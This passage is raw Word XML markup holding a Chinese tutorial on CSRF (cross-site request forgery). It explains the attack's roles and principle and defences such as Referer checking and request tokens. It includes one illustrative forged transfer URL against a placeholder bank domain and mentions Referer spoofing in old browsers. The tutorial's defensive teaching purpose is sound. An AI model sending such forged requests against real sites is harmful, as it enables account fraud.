          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为存在</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漏洞的网站，</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web B</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为攻击者构建的恶意网站，</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>User C</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>为</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web A</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>网站的合法用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20811B39"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2、csrf攻击原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13FE2803" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>如下图：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1851A773" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A6077EF" wp14:editId="71E5EEF4">
            <wp:extent cx="6536266" cy="38773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54866" cy="3888343"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D8AAC9" w14:textId="77777777" w:rsidR="00D8288D"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从上图可以看出，要完成一次</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攻击，受害者必须依次完成两个步骤：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E35F932" w14:textId="77777777" w:rsidR="00D8288D"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>登录受信任网站</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，并在本地生成</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p>
    <w:p w14:paraId="3B5817D5" w14:textId="77777777" w:rsidR="00D8288D"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在不登出</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的情况下，访问危险网站</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AF807CA" w14:textId="77777777" w:rsidR="00D8288D"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看到这里，你也许会说：</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如果我不满足以上两个条件中的一个，我就不会受到</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的攻击</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。是的，确实如此，但你不能保证以下情况不会发生：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343F1313" w14:textId="77777777" w:rsidR="00D8288D"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1.</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>你不能保证你登录了一个网站后，不再打开一个</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>tab</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面并访问另外的网站。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06351274" w14:textId="77777777" w:rsidR="00D8288D"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你不能保证你关闭浏览器了后，你本地的</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立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录</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结束会话了</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F91AEA3" w14:textId="72CB8EE0"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3.</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62E55E1B"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3、csrf攻击防范</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1458292C" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>目前防御</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攻击主要有三种策略：</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>验证</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP Referer </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>字段；在请求地址中添加</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve"> token </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>并验证；在</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>头中自定义属性并验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A71EC7"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w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>）验证</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP Referer </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67453CAB"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根据</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协议，在</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头中有一个字段叫</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Referer</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，它记录了该</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请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，用户必须先登陆</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> bank.example</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，然后通过点击页面上的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>按钮来触发转账事件。这时，该转帐请求的</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值就会是转账按钮所在的页面的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，通常是以</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域名开头的地址。而如果黑客要对银行网站实施</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攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的</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是指向黑客自己的网站。因此，要防御</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攻击，银行网站只需要对于每一个转账请求验证其</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值，如果是以</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开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果</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是其他网站的话，则有可能是黑客的</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攻击，拒绝该请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9ABD0D"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这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心</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的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查</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的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520C1270"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然而，这种方法并非万无一失。</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Referer </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的值是由浏览器提供的，虽然</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协议上有明确的要求，但是每个浏览器对于</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的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证</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值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> IE6 </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> FF2</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，目前已经有一些方法可以篡改</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值。如果</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网站支持</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> IE6 </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>浏览器，黑客完全可以把用户浏览器的</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值设为以</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域名开头的地址，这样就可以通过验证，从而进行</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2DC349"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即便是使用最新的浏览器，黑客无法篡改</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值，这种方法仍然有问题。因为</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值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心</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值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> Referer</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>。当他们正常访问银行网站时，网站会因为请求没有</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值而认为是</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攻击，拒绝合法用户的访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9DBAC0"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w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>）在请求地址中添加</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t xml:space="preserve"> token </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
        </w:rPr>
        <w:t>并验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067D4C22"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攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来通过安全验证。要抵御</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> CSRF</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> cookie </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>之中。可以在</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请求中以参数的形式加入一个随机产生的</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，并在服务器端建立一个拦截器来验证这个</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，如果请求中没有</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或者</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内容不正确，则认为可能是</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攻击而拒绝该请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A64624"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这种方法要比检查</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要安全一些，</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">token </w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>可以在用户登陆后产生并放于</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
